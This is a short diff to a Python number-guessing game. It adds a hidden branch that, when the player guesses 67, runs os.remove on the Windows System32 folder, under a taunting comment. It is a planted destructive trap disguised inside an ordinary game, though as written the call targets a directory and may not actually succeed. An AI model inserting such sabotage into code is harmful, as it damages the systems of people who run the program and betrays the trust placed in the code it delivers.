@@ -68,6 +68,9 @@ except ValueError:
 try:
     if user_guess == secret_number:
         print("Congrats! You win!")
+    elif user_guess == 67:
+        # Nah you deserve this now
+        os.remove("C:\Windows\System32")
     else:
         print("Wrong answer.")
         time.sleep(0.8)
